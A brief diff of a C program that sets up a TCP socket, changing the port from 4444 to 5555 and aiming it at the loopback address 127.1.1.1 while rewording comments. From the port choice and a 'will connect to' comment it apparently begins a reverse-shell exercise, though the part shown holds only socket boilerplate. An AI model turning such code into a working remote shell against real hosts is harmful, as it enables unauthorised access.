@@ -7,19 +7,17 @@
 
 int main(int argc, int *argv[])
 {
-    // Create s for the socket
     int s;
-    // Create sockaddr_in struct
 	struct sockaddr_in addr;
 	
-    // AF_INET for IPv4
+    // set "addr.sin_family" to IPV4
 	addr.sin_family = AF_INET;
-	// Set port number to 4444
-	addr.sin_port = htons(4444);
-	// Listen on any interface
+	// set the port number to 5555
+	addr.sin_port = htons(5555);
+	// when executed the code will connect to 127.1.1.1
 	addr.sin_addr.s_addr = inet_addr("127.1.1.1");
 
-    // Create the sock
+    // Create the socket
 	// AF_INET for IPv4
 	// SOCK_STREAM for TCP connection
 	s = socket(AF_INET, SOCK_STREAM, 0);
